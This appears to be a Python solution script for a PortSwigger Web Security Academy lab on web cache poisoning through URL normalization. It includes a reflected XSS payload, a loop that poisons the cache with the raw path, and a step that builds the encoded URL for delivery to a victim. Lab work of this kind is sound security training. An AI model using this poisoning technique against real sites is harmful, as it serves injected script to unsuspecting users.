"""
Lab 10: URL normalization
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization
Difficulty: Expert

📝 A reflected-XSS bug exists but isn't directly exploitable because the
BROWSER url-encodes special characters in the address bar before sending
them. The CACHE, however, url-DECODES the request line before computing
its key AND before forwarding — poison the cache using the already-decoded
(working) payload via Burp, then deliver the STILL-ENCODED version of that
same URL to the victim: their browser sends the encoded form (which looks
inert to it), but the cache normalizes it and matches the poisoned entry
anyway, serving the working payload.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"

# Raw (unencoded) payload — this is what we send via Burp/requests directly
# to poison the cache, bypassing normal browser encoding entirely.
RAW_PAYLOAD_PATH = "/random</p><script>alert(1)</script><p>foo"

# URL-encoded version of the same path — THIS is what gets delivered to
# the victim, since their browser would otherwise encode it on its own
# anyway and we want the delivered link to match that automatically.
import urllib.parse
ENCODED_PAYLOAD_PATH = urllib.parse.quote(RAW_PAYLOAD_PATH, safe="/")


def run():
    s = get_session()

    note("Step 1: confirm the raw (unencoded) payload reflects in the")
    note("error page when sent directly — this is the underlying XSS,")
    note("not yet exploitable via a normal browser URL bar.")
    r = s.get(f"{TARGET}{RAW_PAYLOAD_PATH}")
    log(f"Reflected raw: {'<script>alert(1)</script>' in r.text}")

    note("Step 2: poison the cache using the RAW payload directly (as if")
    note("sent from Burp Repeater, bypassing browser encoding).")
    poison_until_hit(s, f"{TARGET}{RAW_PAYLOAD_PATH}")

    note("Step 3: immediately request the ENCODED version — if the cache")
    note("normalizes/decodes before keying, this should STILL hit the")
    note("same poisoned entry.")
    r = s.get(f"{TARGET}{ENCODED_PAYLOAD_PATH}")
    log(f"X-Cache on encoded request: {cache_status(r)!r}")
    log(f"Still reflects payload: {'<script>alert(1)</script>' in r.text}")

    note(f"Deliver this encoded URL to the victim: {TARGET}{ENCODED_PAYLOAD_PATH}")
    note("Their browser sends it AS ENCODED (looks safe to them), but the")
    note("cache's own normalization matches it to our poisoned raw entry.")


if __name__ == "__main__":
    run()
